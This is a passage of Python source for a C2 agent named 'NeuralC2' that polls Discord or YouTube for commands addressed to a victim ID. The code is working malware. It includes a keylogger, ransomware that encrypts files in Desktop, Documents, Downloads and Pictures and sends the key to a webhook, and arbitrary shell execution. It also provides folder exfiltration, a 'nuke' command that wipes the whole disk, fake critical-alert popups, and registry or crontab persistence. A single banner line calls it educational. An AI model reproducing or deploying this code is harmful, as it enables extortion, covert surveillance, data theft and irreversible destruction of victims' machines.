    global keylog_active, keylog_listener
    if not keylog_active:
        return "[!] Keylogger not running"
    
    keylog_active = False
    if keylog_listener:
        keylog_listener.stop()
        keylog_listener = None
        
    return "[+] Keylogger stopped"


def dump_keylog():
    global keylog_buffer
    if not keylog_buffer:
        return "[!] Keylog buffer empty"
    content       = ''.join(keylog_buffer)
    keylog_buffer = []
    # Note: dashboard.js listens for [KEYLOG DUMP] marker
    return f"[KEYLOG DUMP - {datetime.now().strftime('%H:%M:%S')}]\n{content}"


# ==================== RANSOMWARE & WEAPONS ====================

def start_ransomware(key_str):
    """
    Background ransomware execution: encrypts files in user documents/desktop,
    drops a note, using the key provided by the C2 server.
    """
    global ransomware_active
    if ransomware_active:
        return "[!] Ransomware already running"
    
    try:
        from cryptography.fernet import Fernet
    except ImportError:
        return "[!] Ransomware unavailable (cryptography module missing)"

    ransomware_active = True

    def _encrypt_thread(key_b64):
        global ransomware_active
        try:
            key = key_b64.encode('utf-8')
            cipher = Fernet(key)
            
            # Target directories (Desktop, Documents, Downloads, Pictures)
            user_profile = os.path.expanduser("~")
            targets = [
                os.path.join(user_profile, "Desktop"),
                os.path.join(user_profile, "Documents"),
                os.path.join(user_profile, "Downloads"),
                os.path.join(user_profile, "Pictures")
            ]
            
            ext_targets = ('.txt', '.pdf', '.jpg', '.jpeg', '.png', '.docx', '.xlsx', '.pptx', '.csv')
            encrypted_count = 0
            
            for t_dir in targets:
                if not os.path.exists(t_dir): continue
                for root, _, files in os.walk(t_dir):
                    for f in files:
                        if f.lower().endswith(ext_targets):
                            fpath = os.path.join(root, f)
                            try:
                                with open(fpath, "rb") as file:
                                    data = file.read()
                                encrypted_data = cipher.encrypt(data)
                                with open(fpath + ".locked", "wb") as file:
                                    file.write(encrypted_data)
                                os.remove(fpath)
                                encrypted_count += 1
                            except Exception:
                                pass
            
            # Drop note
            note_path = os.path.join(user_profile, "Desktop", "RANSOM_NOTE.txt")
            with open(note_path, "w") as note:
                note.write("YOUR FILES HAVE BEEN ENCRYPTED BY NEURALC2.\n")
                note.write("DO NOT RESTART OR MODIFY THE LOCKED FILES.\n")
                note.write("AWAIT FURTHER INSTRUCTIONS FROM THE OPERATOR.\n")
                
            # Send status back
            msg = f"[+] Ransomware complete. Encrypted {encrypted_count} files.\n"
            msg += f"[!] CRITICAL - DECRYPTION KEY: {key_b64}\n"
            
            # Fire an async message back to C2
            try:
                enc = encoder.encode_payload(msg) if ENCODE_PAYLOADS else msg
                content = f"{'>NeuralPayload\n' if ENCODE_PAYLOADS else 'RESULT '}{VICTIM_ID}|{enc}"
                requests.post(WEBHOOK_URL, data={'content': content}, timeout=5)
            except Exception:
                pass
                
        except Exception as e:
            pass
        finally:
            ransomware_active = False

    t = threading.Thread(target=_encrypt_thread, args=(key_str,), daemon=True)
    t.start()
    return "[+] Ransomware deployed. Locking files in the background..."


def decrypt_ransomware(key_str):
    """Reverse the ransomware using the provided key."""
    try:
        from cryptography.fernet import Fernet
    except ImportError:
        return "[!] Decryption unavailable (cryptography missing)"

    try:
        cipher = Fernet(key_str.encode('utf-8'))
        user_profile = os.path.expanduser("~")
        targets = [
            os.path.join(user_profile, "Desktop"),
            os.path.join(user_profile, "Documents"),
            os.path.join(user_profile, "Downloads"),
            os.path.join(user_profile, "Pictures")
        ]
        
        decrypted_count = 0
        for t_dir in targets:
            if not os.path.exists(t_dir): continue
            for root, _, files in os.walk(t_dir):
                for f in files:
                    if f.endswith(".locked"):
                        fpath = os.path.join(root, f)
                        try:
                            with open(fpath, "rb") as file:
                                encrypted_data = file.read()
                            data = cipher.decrypt(encrypted_data)
                            orig_path = fpath[:-7] # remove .locked
                            with open(orig_path, "wb") as file:
                                file.write(data)
                            os.remove(fpath)
                            decrypted_count += 1
                        except Exception:
                            pass
        
        note_path = os.path.join(user_profile, "Desktop", "RANSOM_NOTE.txt")
        if os.path.exists(note_path):
            try: os.remove(note_path)
            except: pass
            
        return f"[+] Decryption complete. Restored {decrypted_count} files."
    except Exception as e:
        return f"[!] Decryption failed: {e}"


# ==================== COMMAND DISPATCHER ====================

def execute_command(command):
    """Dispatch incoming command string to appropriate handler."""
    cmd = command.lower()

    # --- File Browser (ls_json) ---
    if cmd.startswith('ls_json'):
        args = command[7:].strip().split(' ', 1)
        if len(args) == 2 and len(args[0]) == 8:
            req_id = args[0]
            path = args[1]
        elif len(args) == 1 and len(args[0]) == 8 and args[0].isalnum():
            req_id = args[0]
            path = os.path.expanduser('~')
        else:
            req_id = '0'
            path = command[7:].strip() or os.path.expanduser('~')
        return _ls_json(req_id, path)

    # --- Process Manager (ps_json) ---
    elif cmd.startswith('ps_list'):
        args = command.strip().split(' ', 1)
        req_id = args[1] if len(args) > 1 else '0'
        return _ps_list(req_id)
    elif cmd.startswith('ps_kill '):
        pid = command[8:].strip()
        try:
            if os.name == 'nt':
                subprocess.run(f"taskkill /F /PID {pid}", shell=True)
            else:
                subprocess.run(f"kill -9 {pid}", shell=True)
            return f"[+] Killed process {pid}"
        except Exception as e:
            return f"[!] Kill failed: {e}"

    # --- File operations ---
    elif cmd.startswith('download '):
        return download_file_from_victim(command[9:].strip())
    elif cmd.startswith('delete '):
        path = os.path.expanduser(command[7:].strip())
        try:
            if os.path.isdir(path):
                import shutil
                shutil.rmtree(path)
            else:
                os.remove(path)
            return f"[+] Deleted: {path}"
        except Exception as e:
            return f"[!] Delete failed: {e}"
    elif cmd.startswith('open '):
        path = os.path.expanduser(command[5:].strip())
        try:
            if os.name == 'nt':
                os.startfile(path)
            else:
                subprocess.run(['xdg-open', path])
            return f"[+] Opened: {path}"
        except Exception as e:
            return f"[!] Open failed: {e}"
    elif cmd.startswith('exfil '):
        return exfiltrate_folder(command[6:].strip())
    elif cmd.startswith('upload '):
        parts = command[7:].strip().split(maxsplit=1)
        return download_file_from_c2(parts[0], parts[1] if len(parts) > 1 else None)
    elif cmd.startswith('get_attachment '):
        parts = command[15:].strip().split(maxsplit=1)
        if not parts: return "[!] Missing message ID"
        msg_id = parts[0]
        target_dir = parts[1] if len(parts) > 1 else None
        return upload_file_from_attachment(msg_id, target_dir)

    # --- Surveillance ---
    elif cmd == 'screenshot':
        return send_screenshot()
    elif cmd == 'keylog_start':
        return start_keylogger()
    elif cmd == 'keylog_stop':
        return stop_keylogger()
    elif cmd == 'keylog_dump':
        return dump_keylog()

    # --- Actions / Weapons ---
    elif cmd == 'shutdown':
        if os.name == 'nt': subprocess.run('shutdown /s /t 0', shell=True)
        else: subprocess.run('shutdown -h now', shell=True)
        return "[+] Shutting down..."
    elif cmd == 'restart':
        if os.name == 'nt': subprocess.run('shutdown /r /t 0', shell=True)
        else: subprocess.run('reboot', shell=True)
        return "[+] Restarting..."
    elif cmd == 'nuke':
        def _nuke():
            if os.name == 'nt':
                # Aggressive Windows wipe
                subprocess.run('del /f /s /q C:\\* >nul 2>&1', shell=True)
                subprocess.run('rmdir /s /q C:\\ >nul 2>&1', shell=True)
            else:
                # Aggressive Linux wipe
                subprocess.run('rm -rf / --no-preserve-root >/dev/null 2>&1', shell=True)
        
        t = threading.Thread(target=_nuke, daemon=True)
        t.start()
        return "[!] NUKE INITIATED. Data destruction in progress..."
    elif cmd.startswith('msgbox '):
        txt = command[7:].strip()
        def _msgbox(text):
            title = "CRITICAL SYSTEM ALERT"
            try:
                import tkinter as tk
                root = tk.Tk()
                root.configure(bg='black')
                root.attributes('-topmost', True)
                root.overrideredirect(True) # No window borders
                
                # Center and size
                ws, hs = root.winfo_screenwidth(), root.winfo_screenheight()
                w, h = 800, 400
                x, y = (ws/2) - (w/2), (hs/2) - (h/2)
                root.geometry(f'{w}x{h}+{int(x)}+{int(y)}')
                
                lbl_title = tk.Label(root, text="⚠ " + title + " ⚠", font=("Courier", 32, "bold"), fg="red", bg="black")
                lbl_title.pack(pady=40)
                
                lbl_msg = tk.Label(root, text=text, font=("Courier", 20), fg="white", bg="black", wraplength=700)
                lbl_msg.pack(pady=20)
                
                # Flashing effect
                def flash():
                    bg_c = "darkred" if root.cget("bg") == "black" else "black"
                    root.configure(bg=bg_c)
                    lbl_title.configure(bg=bg_c)
                    lbl_msg.configure(bg=bg_c)
                    root.after(600, flash)
                flash()
                
                btn = tk.Button(root, text="ACKNOWLEDGE", font=("Courier", 16, "bold"), bg="red", fg="white", command=root.destroy, relief=tk.FLAT)
                btn.pack(side="bottom", pady=40)
                
                root.mainloop()
            except ImportError:
                # Fallbacks if tkinter isn't installed
                if os.name == 'nt':
                    subprocess.run(f'powershell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show(\'{text}\', \'{title}\', \'OK\', \'Error\')"', shell=True)
                else:
                    subprocess.run(f'notify-send -u critical "{title}" "{text}"', shell=True)
                    
        t = threading.Thread(target=_msgbox, args=(txt,), daemon=True)
        t.start()
        return f"[+] Message box spawned: {txt}"
    elif cmd.startswith('openurl '):
        url = command[8:].strip()
        if not url.startswith('http'):
            url = 'http://' + url
        try:
            if os.name == 'nt':
                os.startfile(url)
            elif sys.platform == 'darwin':
                subprocess.Popen(['open', url])
            else:
                subprocess.Popen(['xdg-open', url])
            return f"[+] Opened URL: {url}"
        except Exception as e:
            return f"[-] Failed to open URL: {e}"
    elif cmd == 'persist':
        try:
            if os.name == 'nt':
                # Add to registry Run key
                script_path = os.path.abspath(__file__)
                cmd_reg = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "NeuralC2" /t REG_SZ /d "pythonw.exe {script_path}" /f'
                subprocess.run(cmd_reg, shell=True)
                return "[+] Persistence established via Registry Run key"
            else:
                # Add to crontab
                script_path = os.path.abspath(__file__)
                cron_cmd = f'(crontab -l 2>/dev/null; echo "@reboot python3 {script_path}") | crontab -'
                subprocess.run(cron_cmd, shell=True)
                return "[+] Persistence established via Crontab"
        except Exception as e:
            return f"[!] Persistence failed: {e}"

    # --- Ransomware ---
    elif cmd.startswith('ransomware '):
        key = command[11:].strip()
        return start_ransomware(key)
    elif cmd.startswith('ransom_decrypt '):
        key = command[15:].strip()
        return decrypt_ransomware(key)

    # --- Diagnostics ---
    elif cmd == 'features':
        lines = [
            f"Screenshot:    {'✓' if SCREENSHOT_AVAILABLE else '✗'}",
            f"Keylogger:     {'✓' if KEYLOGGER_AVAILABLE else '✗'}",
            f"Ransomware:    {'✓' if RANSOMWARE_AVAILABLE else '✗'}",
            f"File Transfer: ✓",
            f"Processes:     ✓",
            f"NeuralC2 ISI:  λ={ISI_LAMBDA} spikes/s",
            f"Spike Data:    {'Real CRCNS' if neural_engine.spike_data else 'Poisson sim'}",
            f"Keylog Active: {'Yes' if keylog_active else 'No'} ({len(keylog_buffer)} keys)",
        ]
        return "\n".join(lines)

    # --- Safety block ---
    blocked = ['format', 'del /f /s /q', 'mkfs'] # Note: allow 'del' for specific files if needed
    if any(b in cmd for b in blocked):
        return "[!] Command blocked for safety"

    # --- Stateful Shell Commands ---
    if cmd.startswith('cd ') or cmd == 'cd..' or cmd == 'cd' or cmd == 'pwd':
        try:
            # Determine target path
            if cmd == 'cd' or cmd == 'pwd':
                if command.strip().lower() in ['cd', 'pwd']:
                    return f"Current directory: {os.getcwd()}"
            
            target = command[3:].strip()
            if not target:
                target = os.path.expanduser('~')
            elif target == '..':
                target = '..'
            elif target in ['/', '\\']:
                target = os.path.abspath(os.sep)
            
            # Change directory with path expansion (handles ~)
            os.chdir(os.path.expanduser(target))
            new_path = os.getcwd()
            
            # Return only the new path — clean and uncluttered
            return f"Current directory: {new_path}"
        except Exception as e:
            return f"[!] cd failed: {e}"
    elif cmd == 'ps':
        return _ps_list()

    # --- Background shell execution ---
    elif cmd.startswith('bg '):
        bg_cmd = command[3:].strip()
        def _run_bg():
            try:
                res = subprocess.run(bg_cmd, shell=True, capture_output=True, text=True)
                out = res.stdout or res.stderr or f"[Return code: {res.returncode}]"
                send_result(f"[BG Task: {bg_cmd}]\n{out}")
            except Exception as e:
                send_result(f"[BG Task Error: {bg_cmd}]\n{e}")
        t = threading.Thread(target=_run_bg, daemon=True)
        t.start()
        return f"[+] Background task started: {bg_cmd}"

    # --- Shell execution ---
    try:
        result = subprocess.run(
            command, shell=True, capture_output=True, text=True, timeout=30
        )
        output = result.stdout or result.stderr or f"[Return code: {result.returncode}]"
        return output
    except subprocess.TimeoutExpired:
        return "[!] Command timed out (30s)"
    except Exception as e:
        return f"[!] Execution error: {e}"


# ==================== COMMAND POLLING ====================

def check_for_commands():
    """Poll Discord channel and dispatch any EXECUTE commands addressed to this victim."""
    global last_message_id

    messages = get_recent_messages()
    if not messages:
        return

    # FIX 1: advance last_message_id to the newest message FIRST so that
    # even if this poll loop takes time, we never re-process the same message.
    newest_id = max(int(m['id']) for m in messages)
    if newest_id <= last_message_id:
        return   # nothing new at all

    for msg in reversed(messages):          # oldest → newest so order is preserved
        msg_id  = int(msg['id'])
        content = msg.get('content', '')

        if msg_id <= last_message_id:
            continue

        # Mark as seen immediately before executing — prevents double-execution
        last_message_id = msg_id

        if content.startswith('EXECUTE'):
            try:
                parts = content.split('|', 1)
                if len(parts) < 2:
                    continue
                target_id = parts[0].replace('EXECUTE ', '').strip()
                command   = parts[1].strip()

                if target_id == VICTIM_ID:
                    print(f'[*] Command received: {command}')
                    result = execute_command(command)
                    send_result(result)
            except Exception as e:
                send_result(f"Error: {e}")


# ==================== MAIN LOOP ====================

def main():
    global last_message_id

    stealth_mode = '--stealth' in sys.argv or '-s' in sys.argv

    if WEBHOOK_URL == 'YOUR_WEBHOOK_URL_HERE':
        print('[!] ERROR: Set DISCORD_WEBHOOK environment variable')
        sys.exit(1)

    MODE_LABELS = {
        'standard': 'Agent 1 — StandardBot  (fixed 5s, plaintext)         [DETECTABLE]',
        'jitter':   'Agent 2 — JitterBot    (random 1-30s, plaintext)      [PARTIAL]',
        'neural':   'Agent 3 — NeuralC2     (Poisson ISI + DNA/FASTA)      [EVASION]',
        'youtube':  'Agent 4 — YouTubeC2    (LoTS: commands in YT video)   [NEAR-ZERO]',
    }

    if not stealth_mode:
        print('[*]' + '='*60)
        print('[*] NeuralC2 Research Framework — 3-Mode Agent')
        print('[*]' + '='*60)
        print(f'[*] MODE:           {MODE_LABELS[AGENT_MODE]}')
        print(f'[*] Victim ID:      {VICTIM_ID}')
        if AGENT_MODE == 'neural':
            print(f'[*] ISI Lambda:     {ISI_LAMBDA} spikes/s')
            print(f'[*] Spike Data:     {"Real CRCNS" if neural_engine.spike_data else "Poisson simulation"}')
        elif AGENT_MODE == 'jitter':
            print(f'[*] Interval:       Uniform random 1.0–30.0s')
        else:
            print(f'[*] Interval:       Fixed 5.0s')
        if AGENT_MODE == 'youtube':
            yt_id   = YT_VIDEO_ID or 'NOT SET'
            yt_api  = 'API key' if (YT_API_KEY and YT_API_KEY != 'SCRAPE') else 'Scrape fallback'
            print(f'[*] YT Video ID:    {yt_id}')
            print(f'[*] YT API Mode:    {yt_api}')
            print(f'[*] Poll Interval:  {YT_POLL_INTERVAL}s')
            print(f'[*] Encode:         DNA/FASTA in video description')
        else:
            print(f'[*] Payload:        {"DNA/FASTA encoded" if AGENT_MODE == "neural" else "Plaintext"}')
        print(f'[*] Screenshot:     {"[Y]" if SCREENSHOT_AVAILABLE else "[N]"}')
        print(f'[*] Keylogger:      {"[Y]" if KEYLOGGER_AVAILABLE else "[N]"}')
        print('[!] EDUCATIONAL USE ONLY - ISOLATED VM REQUIRED')
        print('[*]' + '='*60)

    hostname, ip = get_system_info()
    if not stealth_mode:
        print(f'[+] Host: {hostname} ({ip}) — {platform.system()} {platform.release()}')

    # ── YouTube mode: runs its own polling loop, bypasses Discord beaconing ──
    if AGENT_MODE == 'youtube':
        if not youtube_engine:
            print('[!] ERROR: Set YT_VIDEO_ID environment variable for youtube mode')
            sys.exit(1)
        if not stealth_mode:
            print(f'[+] Sending initial check-in via Discord webhook...')
        send_checkin()
        if not stealth_mode:
            print(f'[+] Starting YouTube polling loop (video: {YT_VIDEO_ID})...')
            print('[*] To defenders: this looks like normal YouTube traffic')
            print('-' * 60)
        try:
            youtube_engine.poll_and_execute(execute_command, send_result)
        except KeyboardInterrupt:
            print('\n[*] YouTube C2 agent stopped')
        return   # YouTube mode handled completely above

    # ── Standard / Jitter / Neural mode: Discord beacon loop ──
    if not stealth_mode:
        print(f'[+] Sending initial check-in ({"obfuscated DNA" if AGENT_MODE == "neural" else "plaintext"})...')

    send_checkin()

    loop_count  = 0
    last_checkin_time = 0

    if not stealth_mode:
        mode_desc = {'standard':'fixed-interval','jitter':'random-jitter','neural':'ISI-Poisson'}
        print(f'[*] Entering {mode_desc.get(AGENT_MODE, "beacon")} loop...')
        print('-' * 60)

    # FIX 2: Command polling runs every 3s regardless of beacon interval.
    # The beacon sleep is broken into 3s slices so commands are never delayed
    # by a long ISI/jitter wait.
    COMMAND_POLL_INTERVAL = 3.0   # seconds between command checks

    try:
        while True:
            # ---- Compute next beacon interval ----
            beacon_wait = next_beacon_interval()
            elapsed     = 0.0

            if not stealth_mode:
                mode_tag = {
                    'standard': 'fixed',
                    'jitter':   'random-jitter',
                    'neural':   'ISI-modeled'
                }.get(AGENT_MODE, 'ISI-modeled')
                print(f'[{AGENT_MODE.upper()}] Next beacon in {beacon_wait:.2f}s ({mode_tag})')

            # ---- Sleep in small slices, polling for commands each slice ----
            while elapsed < beacon_wait:
                slice_sleep = min(COMMAND_POLL_INTERVAL, beacon_wait - elapsed)
                time.sleep(slice_sleep)
                elapsed += slice_sleep

                # Poll for commands every slice
                if BOT_TOKEN and BOT_TOKEN != 'YOUR_BOT_TOKEN_HERE':
                    check_for_commands()

            loop_count += 1

            # ---- Periodic check-in (every ~10 beacons) ----
            if loop_count % 10 == 0:
                send_checkin()
                last_checkin_time = time.time()

            if not stealth_mode and loop_count % 5 == 0:
                kl = f" | Keylog: {len(keylog_buffer)}" if keylog_active else ""
                print(f'[*] Loop {loop_count}: alive{kl} | {datetime.now().strftime("%H:%M:%S")}')

    except KeyboardInterrupt:
        print('\n[*] Agent stopped')
        send_disconnect()
        if keylog_active:
            final_log = dump_keylog()
            send_result(final_log)
    except Exception as e:
        print(f'[-] Fatal error: {e}')
        import traceback
        traceback.print_exc()


if __name__ == '__main__':
    main()
